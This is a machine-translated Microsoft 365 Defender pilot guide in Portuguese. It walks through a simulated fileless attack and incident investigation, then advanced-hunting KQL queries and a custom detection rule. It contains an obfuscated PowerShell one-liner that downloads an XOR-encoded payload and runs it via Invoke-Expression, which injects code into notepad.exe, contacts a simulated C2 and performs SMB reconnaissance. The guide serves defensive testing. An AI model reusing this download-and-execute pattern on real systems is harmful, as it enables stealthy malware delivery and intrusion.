---
title: Executar suas simulações de ataque do Microsoft 365 Defender
description: Execute simulações de ataque para seu projeto piloto do Microsoft 365 Defender para ver como ele se desenvolve e é rapidamente remediado.
keywords: Simulação de ataque piloto do Microsoft 365 Defender, executar simulação de ataque piloto do Microsoft 365 Defender, simular ataque no Microsoft 365 Defender, projeto piloto do Microsoft 365 Defender, segurança cibernética, ameaça persistente avançada, segurança corporativa, dispositivos, dispositivos, identidade, usuários, dados, aplicativos, incidentes, investigação e correção automatizadas, busca avançada
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 767a7ea4c4c7604d1d4b227f08e4ca32c62737c5
ms.sourcegitcommit: a8d8cee7df535a150985d6165afdfddfdf21f622
ms.translationtype: MT
ms.contentlocale: pt-BR
ms.lasthandoff: 04/21/2021
ms.locfileid: "51934472"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a>Executar suas simulações de ataque do Microsoft 365 Defender

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|[![Planejamento](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)<br/>[Planejamento](m365d-pilot-plan.md)|[![Preparar](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)<br/>[Preparação](prepare-m365d-eval.md)|![Simular ameaças](../../media/phase-diagrams/3-simluate.png)<br/>Simular ameaças|[![Fechar e resumir](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)<br/>[Fechar e resumir](m365d-pilot-close.md)|
|--|--|--|--|
|||*Você está aqui!*||

No momento, você está na fase de simulação de ataque.

Depois de preparar seu ambiente piloto, é hora de testar o gerenciamento de incidentes do Microsoft 365 Defender e os recursos automatizados de investigação e correção. Ajudaremos você a simular um ataque sofisticado que utiliza técnicas avançadas para ocultar da detecção. O ataque enumera sessões SMB (Bloqueio de Mensagens do Servidor) abertas em controladores de domínio e recupera endereços IP recentes dos dispositivos dos usuários. Essa categoria de ataques geralmente não inclui arquivos descartados no dispositivo da vítima— eles ocorrem apenas na memória. Eles "vivem da terra" usando o sistema e as ferramentas administrativas existentes e injetam seu código em processos do sistema para ocultar sua execução, Esse comportamento permite que eles evadam a detecção e persistam no dispositivo.

Nesta simulação, nosso cenário de exemplo começa com um script do PowerShell. Um usuário pode ser enganoso para executar um script. Ou o script pode ser executado de uma conexão remota com outro computador de um dispositivo infectado anteriormente, o invasor tentando se mover lateralmente na rede. A detecção desses scripts pode ser difícil porque os administradores também costumam executar scripts remotamente para realizar várias atividades administrativas.

![Ataque do PowerShell sem arquivo com injeção de processo e diagrama de ataque de reconnaisance SMB](../../media/mtp/mtpdiydiagram.png)

Durante a simulação, o ataque injeta o shellcode em um processo aparentemente inocêncio. O cenário requer o uso de notepad.exe. Escolhemos esse processo para a simulação, mas os invasores provavelmente direcionariam um processo de sistema de longa duração, como svchost.exe. Em seguida, o shellcode entra em contato com o servidor de comando e controle (C2) do invasor para receber instruções sobre como prosseguir. O script tenta executar consultas de reconhecimento no controlador de domínio (DC). O reconhecimento permite que um invasor receba informações sobre informações de logon recentes do usuário. Depois que os invasores têm essas informações, eles podem se mover lateralmente na rede para chegar a uma conta sensível específica

> [!IMPORTANT]
> Para obter resultados ideais, siga as instruções de simulação de ataque o mais próximo possível.

## <a name="simulation-environment-requirements"></a>Requisitos de ambiente de simulação

Como você já configurou seu ambiente piloto durante a fase de preparação, verifique se você tem dois dispositivos para esse cenário: um dispositivo de teste e um controlador de domínio.

1. Verifique se o locatário [habilitar o Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).

2. Verifique a configuração do controlador de domínio de teste:

   - O dispositivo é executado com o Windows Server 2008 R2 ou uma versão posterior.
   - O controlador de domínio de teste [para o Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) e habilitar o gerenciamento [remoto](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).
   - Verifique se [a integração do Microsoft Defender for Identity e](/cloud-app-security/mdi-integration) do Microsoft Cloud App Security foi habilitada.
   - Um usuário de teste é criado em seu domínio – nenhuma permissão de administrador necessária.

3. Verifique a configuração do dispositivo de teste:

   1. O dispositivo é executado com o Windows 10 versão 1903 ou uma versão posterior.

   1. O dispositivo de teste é ingressado no domínio de teste.

   1. [A Windows Defender Antivírus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Se você estiver com problemas para habil Windows Defender Antivírus, consulte este tópico [de solução de problemas.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)

   1. Verifique se o dispositivo de teste está [conectado ao Microsoft Defender para Ponto de Extremidade)](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

Se você usar um locatário existente e implementar grupos de dispositivos, crie um grupo de dispositivos dedicado para o dispositivo de teste e pressione-o para o nível superior no UX de configuração.

## <a name="run-the-attack-scenario-simulation"></a>Executar a simulação de cenário de ataque

Para executar a simulação de cenário de ataque:

1. Faça logoff no dispositivo de teste com a conta de usuário de teste.

2. Abra uma Windows PowerShell no dispositivo de teste.

3. Copie o seguinte script de simulação:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Se você abrir esse documento em um navegador da Web, poderá encontrar problemas para copiar o texto completo sem perder determinados caracteres ou introduzir quebras de linha extras. Baixe este documento e abra-o no Adobe Reader.

4. No prompt, colar e executar o script copiado.

> [!NOTE]
> Se você estiver executando o PowerShell usando o protocolo de área de trabalho remota (RDP), use o comando Texto da Área de Transferência de Tipo no cliente RDP porque a tecla de atalho **CTRL-V** ou o método clique com o botão direito do mouse pode não funcionar. As versões recentes do PowerShell às vezes também não aceitarão esse método, talvez seja preciso copiar para o Bloco de Notas na memória primeiro, copiá-lo na máquina virtual e, em seguida, colar no PowerShell.

Alguns segundos depois, <i>notepad.exe</i> abrirá. Um código de ataque simulado será injetado no notepad.exe. Mantenha a instância do Bloco de Notas gerada automaticamente aberta para experimentar o cenário completo.

O código de ataque simulado tentará se comunicar com um endereço IP externo (simulando o servidor C2) e tentará reconhecimento contra o controlador de domínio por meio de SMB.

Você verá uma mensagem exibida no console do PowerShell quando esse script for concluído.

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Para ver o recurso Incidente Automatizado e Resposta em ação, mantenha o processo notepad.exe aberto. Você verá Incidente Automatizado e Resposta interromper o processo do Bloco de Notas.

## <a name="investigate-an-incident"></a>Investigar um incidente

> [!NOTE]
> Antes de passar por essa simulação, assista ao vídeo a seguir para ver como o gerenciamento de incidentes ajuda você a reunir os alertas relacionados como parte do processo de investigação, onde você pode encontrá-lo no portal e como ele pode ajudá-lo em suas operações de segurança:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Mudando para o ponto de vista do analista SOC, agora você pode começar a investigar o ataque no portal da Central de Segurança do Microsoft 365.

1. Abra a fila de incidentes do portal do Centro de Segurança do [Microsoft 365](https://security.microsoft.com/incidents) de qualquer dispositivo.

2. Navegue **até Incidentes** no menu.

    ![Captura de tela de incidentes, conforme mostrado no menu esquerdo do Centro de Segurança do Microsoft 365](../../media/mtp/fig1.png)

3. O novo incidente do ataque simulado aparecerá na fila de incidentes.

    ![Captura de tela da fila de incidentes](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a>Investigar o ataque como um único incidente

O Microsoft 365 Defender correlaciona a análise e agrega todos os alertas e investigações relacionados de diferentes produtos em uma entidade de incidente. Ao fazer isso, o Microsoft 365 Defender mostra uma história de ataque mais ampla, permitindo que o analista soc compreenda e responda a ameaças complexas.

Os alertas gerados durante essa simulação são associados à mesma ameaça e, como resultado, são automaticamente agregados como um único incidente.

Para exibir o incidente:

1. Navegue até **a fila Incidentes.**

   ![Captura de tela de incidentes do menu de navegação](../../media/mtp/fig1.png)

2. Selecione o item mais recente clicando no círculo localizado à esquerda do nome do incidente. Um painel lateral exibe informações adicionais sobre o incidente, incluindo todos os alertas relacionados. Cada incidente tem um nome exclusivo que o descreve com base nos atributos dos alertas que ele inclui.

   ![Captura de tela da página de incidentes em que alertas gerados são agregados durante a simulação](../../media/mtp/fig4.png)

   Os alertas que aparecem no painel podem ser filtrados com base nos recursos de serviço: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender e Microsoft Defender para Office 365.

3. Selecione **Abrir página de incidentes** para obter mais informações sobre o incidente.

   Na página **Incidente,** você pode ver todos os alertas e informações relacionadas ao incidente. As informações incluem as entidades e ativos envolvidos no alerta, a fonte de detecção dos alertas (Microsoft Defender para Identidade, EDR) e o motivo pelo qual foram vinculados juntos. Analisar a lista de alertas de incidentes mostra a progressão do ataque. Neste ponto de vista, você pode ver e investigar os alertas individuais.

   Você também pode clicar em **Gerenciar incidentes** no menu à direita, para marcar o incidente, atribuí-lo a si mesmo e adicionar comentários.

   ![Captura de tela de onde clicar em Gerenciar incidente](../../media/mtp/fig5a.png)

   ![Captura de tela dos campos no painel gerenciar incidentes onde você pode marcar o incidente, atribuí-lo a si mesmo e adicionar comentários ](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a>Revisar alertas gerados

Vamos ver alguns dos alertas gerados durante o ataque simulado.

> [!NOTE]
> Vamos passar por apenas alguns dos alertas gerados durante o ataque simulado. Dependendo da versão do Windows e dos produtos do Microsoft 365 Defender em execução em seu dispositivo de teste, você pode ver mais alertas que aparecem em uma ordem ligeiramente diferente.

![Captura de tela de alertas gerados](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a>Alerta: injeção de processo suspeito observada (Fonte: Microsoft Defender para EDR do Ponto de Extremidade)

Invasores avançados usam métodos sofisticados e furtivos para persistir na memória e se ocultar das ferramentas de detecção. Uma técnica comum é operar de dentro de um processo de sistema confiável, em vez de um executável mal-intencionado, tornando difícil para as ferramentas de detecção e as operações de segurança detectarem o código mal-intencionado.

Para permitir que os analistas soc detectem esses ataques avançados, os sensores de memória profunda no Microsoft Defender para Ponto de Extremidade fornecem ao nosso serviço de nuvem visibilidade sem precedentes em uma variedade de técnicas de injeção de código entre processos. A figura a seguir mostra como o Defender for Endpoint detectou e alertou sobre a tentativa de injetar código <i>notepad.exe</i>.

![Captura de tela do alerta para injeção de código potencialmente mal-intencionado](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a>Alerta: comportamento inesperado observado por um processo executado sem argumentos de linha de comando (Fonte: Microsoft Defender para EDR do Ponto de Extremidade)

As detecções do Microsoft Defender para Ponto de Extremidade geralmente visam o atributo mais comum de uma técnica de ataque. Esse método garante a durabilidade e eleva a barra para que os invasores alternem para táticas mais novas.

Empregamos algoritmos de aprendizado em larga escala para estabelecer o comportamento normal de processos comuns em uma organização e em todo o mundo e observar quando esses processos mostram comportamentos anômalos. Esses comportamentos anômalos geralmente indicam que o código estranho foi introduzido e está sendo executado em um processo confiável de outra forma.

Para esse cenário, o processo <i>notepad.exe</i> está exibindo comportamento anormal, envolvendo a comunicação com um local externo. Esse resultado é independente do método específico usado para introduzir e executar o código mal-intencionado.

> [!NOTE]
> Como esse alerta é baseado em modelos de aprendizado de máquina que exigem processamento de back-end adicional, pode levar algum tempo antes de você ver esse alerta no portal.

Observe que os detalhes do alerta incluem o endereço IP externo, um indicador que você pode usar como pivô para expandir a investigação.

Selecione o endereço IP na árvore de processo de alerta para exibir a página de detalhes do endereço IP.

![Captura de tela do alerta para comportamento inesperado por um processo executado sem argumentos de linha de comando](../../media/mtp/fig8.png)

A figura a seguir exibe a página de detalhes do Endereço IP selecionado (clicando no endereço IP na árvore de processo alerta).
![Captura de tela da página detalhes do endereço IP](../../media/mtp/fig9.png)

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Alerta: Reconhecimento de usuário e endereço IP (SMB) (Fonte: Microsoft Defender para Identidade)

A enumeração usando o protocolo SMB (Bloqueio de Mensagens do Servidor) permite que os invasores recebam informações de logon de usuário recentes que os ajudam a mover lateralmente pela rede para acessar uma conta sensível específica.

Nessa detecção, um alerta é disparado quando a enumeração de sessão SMB é executado em um controlador de domínio.

![Captura de tela do alerta do Microsoft Defender for Identity para reconhecimento de endereço IP e usuário](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a>Analisar a linha do tempo do dispositivo [Microsoft Defender para Ponto de Extremidade]

Depois de explorar os vários alertas neste incidente, navegue de volta para a página de incidentes investigada anteriormente. Selecione a **guia Dispositivos** na página incidente para revisar os dispositivos envolvidos neste incidente conforme relatado pelo Microsoft Defender para Ponto de Extremidade e o Microsoft Defender para Identidade.

Selecione o nome do dispositivo em que o ataque foi conduzido, para abrir a página da entidade para esse dispositivo específico. Nessa página, você pode ver alertas que foram disparados e eventos relacionados.

Selecione a **guia Linha** do Tempo para abrir a linha do tempo do dispositivo e exibir todos os eventos e comportamentos observados no dispositivo em ordem cronológica, intercalados com os alertas gerados.

![Captura de tela da linha do tempo do dispositivo com comportamentos](../../media/mtp/fig11.png)

Expandir alguns dos comportamentos mais interessantes fornece detalhes úteis, como árvores de processo.

Por exemplo, role para baixo até encontrar o evento de alerta **Injeção de processo suspeito observada**. Selecione o **powershell.exe injetado** para notepad.exe processo abaixo dele, para exibir a árvore de  processo completa para esse comportamento no gráfico entidades de evento no painel lateral. Use a barra de pesquisa para filtragem, se necessário.

![Captura de tela da árvore de processos para o comportamento de criação de arquivo do PowerShell selecionado](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>Revise as informações do usuário [Microsoft Cloud App Security]

Na página incidente, selecione a guia **Usuários** para exibir a lista de usuários envolvidos no ataque. A tabela contém informações adicionais sobre cada usuário, incluindo a pontuação de Prioridade de Investigação **de** cada usuário.

Selecione o nome de usuário para abrir a página de perfil do usuário onde uma investigação posterior pode ser conduzida. [Leia mais sobre a investigação de usuários arriscados.](/cloud-app-security/tutorial-ueba#identify)

![Captura de tela da página do usuário segurança do aplicativo na nuvem](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a>Investigação e correção automatizadas

> [!NOTE]
>Antes de passar por essa simulação, assista ao vídeo a seguir para se familiarizar com o que é a auto-recuperação automatizada, onde encontrá-la no portal e como ela pode ajudar em suas operações de segurança:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Navegue até o incidente no portal da Central de Segurança do Microsoft 365. A **guia Investigações** na página **Incidente** mostra as investigações automatizadas que foram disparadas pelo Microsoft Defender for Identity e pelo Microsoft Defender para Ponto de Extremidade. A captura de tela abaixo exibe apenas a investigação automatizada disparada pelo Defender para Ponto de Extremidade. Por padrão, o Defender para Ponto de Extremidade remedia automaticamente os artefatos encontrados na fila, o que requer correção.

![Captura de tela de investigações automatizadas relacionadas ao incidente](../../media/mtp/fig14.png)

Selecione o alerta que disparou uma investigação para abrir a **página Detalhes da** Investigação. Você verá os seguintes detalhes:

- Alertas que dispararam a investigação automatizada.
- Usuários e dispositivos afetados. Se os indicadores são encontrados em dispositivos adicionais, esses dispositivos adicionais também serão listados.
- Lista de evidências. As entidades encontradas e analisadas, como arquivos, processos, serviços, drivers e endereços de rede. Essas entidades são analisadas para possíveis relações com o alerta e classificadas como benignas ou mal-intencionadas.
- Ameaças encontradas. Ameaças conhecidas encontradas durante a investigação.

> [!NOTE]
> Dependendo do tempo, a investigação automatizada ainda pode estar em execução. Aguarde alguns minutos para que o processo seja concluído antes de coletar e analisar as evidências e revisar os resultados. Atualize **a página Detalhes da** Investigação para obter as descobertas mais recentes.

![Captura de tela da página detalhes da investigação](../../media/mtp/fig15.png)

Durante a investigação automatizada, o Microsoft Defender para Ponto de Extremidade identificou o processo de notepad.exe, que foi injetado como um dos artefatos que exigem correção. O Defender para Ponto de Extremidade interrompe automaticamente a injeção de processo suspeito como parte da correção automatizada.

Você pode ver <i>notepad.exe</i> da lista de processos em execução no dispositivo de teste.

## <a name="resolve-the-incident"></a>Resolver o incidente

Após a conclusão da investigação e confirmação da correção, feche o incidente.

Selecione **Gerenciar incidente**. De definir o status como **Resolver incidente e** selecione a classificação relevante.

Quando o incidente é resolvido, ele fecha todos os alertas associados no Centro de Segurança do Microsoft 365 e nos portais relacionados.

![Captura de tela da página incidentes com o painel Gerenciar incidentes aberto, onde você pode clicar na opção para resolver incidentes](../../media/mtp/fig16.png)

Isso encerra a simulação de ataque para o gerenciamento de incidentes e cenários automatizados de investigação e correção. A próxima simulação levará você à busca proativa de ameaças por arquivos potencialmente mal-intencionados.

## <a name="advanced-hunting-scenario"></a>Cenário de busca avançada

> [!NOTE]
> Antes de passarmos pela simulação, assista ao vídeo a seguir para entender os conceitos avançados de busca, veja onde você pode encontrá-lo no portal e saiba como ele pode ajudá-lo em suas operações de segurança:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>Requisitos de ambiente de busca

Há uma única caixa de correio interna e um dispositivo necessários para esse cenário. Você também precisará de uma conta de email externa para enviar a mensagem de teste.

1. Verifique se seu locatário [habilitar o Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).
2. Identifique uma caixa de correio de destino a ser usada para receber emails.
    a. Essa caixa de correio deve ser monitorada pelo Microsoft Defender para Office 365 b. O dispositivo do requisito 3 precisa acessar essa caixa de correio
3. Configurar um dispositivo de teste: a. Certifique-se de que você está usando o Windows 10 versão 1903 ou versão posterior.
    b. Junte o dispositivo de teste ao domínio de teste.
    c. [A Windows Defender Antivírus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Se você estiver com problemas para habil Windows Defender antivírus, [consulte este tópico de solução de problemas.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)
    d. [Onboard to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

### <a name="run-the-simulation"></a>Executar a simulação

1. De uma conta de email externa, envie um email para a caixa de correio identificada na etapa 2 da seção requisitos do ambiente de teste. Inclua um anexo que será permitido por meio de quaisquer políticas de filtro de email existentes. Esse arquivo não precisa ser mal-intencionado ou executável. Os tipos de arquivo sugeridos <i>são .pdf,</i> <i>.exe</i> (se permitido) ou documento do Office, como um arquivo do Word.
2. Abra o email enviado do dispositivo configurado conforme definido na etapa 3 da seção requisitos do ambiente de teste. Abra o anexo ou salve o arquivo no dispositivo.

#### <a name="go-hunting"></a>Ir à caça

1. Abra o security.microsoft.com portal.

2. Navegue **até Hunting > Busca Avançada**.

   ![Captura de tela da busca avançada na barra de navegação do portal do Centro de Segurança do M365](../../media/mtp/fig17.png)

3. Crie uma consulta que comece coletando eventos de email.

   1. No painel de consulta, selecione Novo.

   1. Clique duas vezes na tabela EmailEvents do esquema.

      ```console
      EmailEvents
      ```

   1. Altere o período de tempo para as últimas 24 horas. Supondo que o email enviado quando você fez a simulação acima foi nas últimas 24 horas, caso contrário, altere o período de tempo.

      ![Captura de tela de onde você pode alterar o quadro de tempo. Abra o menu suspenso para escolher entre opções de intervalo de quadros de tempo](../../media/mtp/fig18.png)

   1. Execute a consulta. Você pode ter muitos resultados, dependendo do ambiente do piloto.

      > [!NOTE]
      > Consulte a próxima etapa para filtrar opções para limitar o retorno de dados.

      ![Captura de tela dos resultados avançados da consulta de busca](../../media/mtp/fig19.png)

        > [!NOTE]
        > A busca avançada exibe os resultados da consulta como dados tabular. Você também pode optar por exibir os dados em outros tipos de formato, como gráficos.

   1. Veja os resultados e veja se você pode identificar o email que você abriu. Pode levar até 2 horas para a mensagem aparecer em busca avançada. Se o ambiente de email for grande e houver muitos resultados, talvez você queira usar a opção **Mostrar** Filtros para encontrar a mensagem.

      No exemplo, o email foi enviado de uma conta do Yahoo. Clique no ícone ao lado yahoo.com abaixo da seção **+** SenderFromDomain e clique em **Aplicar** para adicionar o  domínio selecionado à consulta. Use a conta de domínio ou email usada para enviar a mensagem de teste na etapa 1 de Executar a Simulação para filtrar seus resultados. Execute a consulta novamente para obter um conjunto de resultados menor para verificar se você vê a mensagem da simulação.

      ![Captura de tela dos filtros. Use filtros para restringir a pesquisa e encontrar o que você está procurando mais rapidamente.](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. Clique nas linhas resultantes da consulta para que você possa inspecionar o registro.

      ![Captura de tela do painel lateral do registro de inspeção que é aberto quando um resultado de busca avançado é selecionado](../../media/mtp/fig21.png)

4. Agora que você verificou que pode ver o email, adicione um filtro para os anexos. Concentre-se em todos os emails com anexos no ambiente. Para esse cenário, concentre-se em emails de entrada, não aqueles que estão sendo enviados de seu ambiente. Remova todos os filtros adicionados para localizar sua mensagem e adicione "| onde **AttachmentCount > 0** e **EmailDirection**  ==  **"Entrada""**

   A consulta a seguir mostrará o resultado com uma lista mais curta do que a consulta inicial para todos os eventos de email:

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. Em seguida, inclua as informações sobre o anexo (como: nome do arquivo, hashes) ao conjunto de resultados. Para fazer isso, participe da **tabela EmailAttachmentInfo.** Os campos comuns a ser usado para ingressar, neste caso são **NetworkMessageId** e **RecipientObjectId**.

   A consulta a seguir também inclui uma linha adicional "| **o project-rename EmailTimestamp=Timestamp**" que ajudará a identificar qual timestamp estava relacionado ao email versus timestamps relacionados às ações de arquivo que você adicionará na próxima etapa.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. Em seguida, use o **valor SHA256** da tabela **EmailAttachmentInfo** para encontrar **DeviceFileEvents** (ações de arquivo que aconteceram no ponto de extremidade) para esse hash. O campo comum aqui será o hash SHA256 para o anexo.

   A tabela resultante agora inclui detalhes do ponto de extremidade (Microsoft Defender para Ponto de Extremidade), como o nome do dispositivo, qual ação foi feita (nesse caso, filtrada para incluir apenas eventos FileCreated) e onde o arquivo foi armazenado. O nome da conta associado ao processo também será incluído.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   Agora você criou uma consulta que identificará todos os emails de entrada onde o usuário abriu ou salvou o anexo. Você também pode refinar essa consulta para filtrar domínios de remetente específicos, tamanhos de arquivo, tipos de arquivo e assim por diante.

7. As funções são um tipo especial de participação, que permite que você puxe mais dados de TI sobre um arquivo, como sua prevalência, informações do signante e do emissor, etc. Para obter mais detalhes sobre o arquivo, use o **enriquecimento da função FileProfile():**

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a>Criar uma detecção

Depois de criar uma consulta que identifique as informações  sobre as que você gostaria de ser alertada se elas acontecerem no futuro, você poderá criar uma detecção personalizada a partir da consulta.

As detecções personalizadas executarão a consulta de acordo com a frequência definida e os resultados das consultas criarão alertas de segurança, com base nos ativos afetados que você escolher. Esses alertas serão correlacionados a incidentes e poderão ser triaged como qualquer outro alerta de segurança gerado por um dos produtos.

1. Na página consulta, remova as linhas 7 e 8 que foram adicionadas na etapa 7 das instruções de busca go e clique em **Criar regra de detecção**.

   ![Captura de tela de onde você pode clicar em criar regra de detecção na página de busca avançada](../../media/mtp/fig22.png)

   > [!NOTE]
   > Se você clicar **em Criar regra de detecção** e tiver erros de sintaxe em sua consulta, sua regra de detecção não será salva. Verifique sua consulta duas vezes para garantir que não haja erros.

2. Preencha os campos necessários com as informações que permitirão que a equipe de segurança entenda o alerta, por que ele foi gerado e quais ações você espera que eles realizem.

   ![Captura de tela da página criar regra de detecção onde você pode definir os detalhes do alerta](../../media/mtp/fig23.png)

   Certifique-se de preencher os campos com clareza para ajudar a dar ao próximo usuário uma decisão informada sobre esse alerta de regra de detecção

3. Selecione quais entidades são impactadas neste alerta. Nesse caso, selecione **Dispositivo e** Caixa de **Correio**.

   ![Captura de tela da página criar regra de detecção onde você pode escolher os parâmetros das entidades impactadas](../../media/mtp/fig24.png)

4. Determine quais ações devem ocorrer se o alerta for disparado. Nesse caso, execute uma verificação de antivírus, embora outras ações poderiam ser tomadas.

   ![Captura de tela da página criar regra de detecção onde você pode executar uma verificação antivírus quando um alerta é disparado para ajudar a lidar com ameaças](../../media/mtp/fig25.png)

5. Selecione o escopo da regra de alerta. Como essa consulta envolve dispositivos, os grupos de dispositivos são relevantes nessa detecção personalizada de acordo com o contexto do Microsoft Defender para o Ponto de Extremidade. Ao criar uma detecção personalizada que não inclua dispositivos como entidades impactadas, o escopo não se aplica.

   ![Captura de tela da página criar regra de detecção onde você pode definir o escopo da regra de alerta gerencia suas expectativas para os resultados que você verá](../../media/mtp/fig26.png)

   Para esse piloto, talvez você queira limitar essa regra a um subconjunto de dispositivos de teste em seu ambiente de produção.

6. Selecione **Criar**. Em seguida, selecione **Regras de detecção personalizadas** no painel de navegação.

   ![Captura de tela da opção Regras de detecção personalizadas no menu](../../media/mtp/fig27a.png)

   ![Captura de tela da página de regras de detecção que exibe os detalhes de regra e execução](../../media/mtp/fig27b.png)

   Nesta página, você pode selecionar a regra de detecção, que abrirá uma página de detalhes.

   ![Captura de tela da página anexos de email onde você pode ver o status da execução da regra, alertas e ações disparados, editar a detecção e assim por diante](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a>Exercícios de passagem de busca avançada adicionais

Para saber mais sobre a busca avançada, os webcasts a seguir o acompanharão pelos recursos de busca avançada no Microsoft 365 Defender para criar consultas entre pilares, pivotar para entidades e criar detecções personalizadas e ações de correção.

> [!NOTE]
> Prepare-se com sua própria conta do GitHub para executar as consultas de busca em seu ambiente de laboratório de teste piloto.

|Título|Descrição|Baixar MP4|Assista no YouTube|Arquivo CSL a ser usado|
|---|---|---|---|---|
|Episódio 1: conceitos básicos de KQL|Vamos abranger os conceitos básicos dos recursos avançados de busca no Microsoft 365 Defender. Saiba mais sobre os dados avançados de busca disponíveis e a sintaxe básica de KQL e operadores.|[MP4](https://aka.ms/MTP15JUL20_MP4)|[YouTube](https://youtu.be/0D9TkGjeJwM)|[Episódio 1: arquivo CSL no Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|Episódio 2: Joins|Continuaremos a aprender sobre dados em busca avançada e como unir tabelas. Saiba mais sobre junções internas, externas, exclusivas e semi e as nuances da junção interna padrão do Kusto.|[MP4](https://aka.ms/MTP22JUL20_MP4)|[YouTube](https://youtu.be/LMrO6K5TWOU)|[Episódio 2: arquivo CSL no Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|Episódio 3: Resumindo, pivotando e visualizando dados|Agora que podemos filtrar, manipular e associar dados, é hora de começar a resumir, quantificar, girar e visualizar. Neste episódio, vamos abranger o operador resumir e alguns dos cálculos que você pode executar ao mergulhar em tabelas adicionais no esquema de busca avançado. Transformamos nossos conjuntos de dados em gráficos que podem ajudar a melhorar a análise.|[MP4](https://aka.ms/MTP29JUL20_MP4)|[YouTube](https://youtu.be/UKnk9U1NH6Y)|[Episódio 3: arquivo CSL no Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|Episódio 4: Vamos procurar! Aplicando KQL ao controle de incidentes|Hora de rastrear alguma atividade de invasor! Neste episódio, vamos usar nossa compreensão aprimorada do KQL e a busca avançada no Microsoft 365 Defender para rastrear um ataque. Saiba algumas das dicas e truques usados no campo para controlar a atividade do invasor, incluindo os ABCs de segurança cibernética e como aplicá-las à resposta a incidentes.|[MP4](https://aka.ms/MTP5AUG20_MP4)|[YouTube](https://youtu.be/2EUxOc_LNd8)|[Episódio 4: arquivo CSL no Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a>Próxima etapa

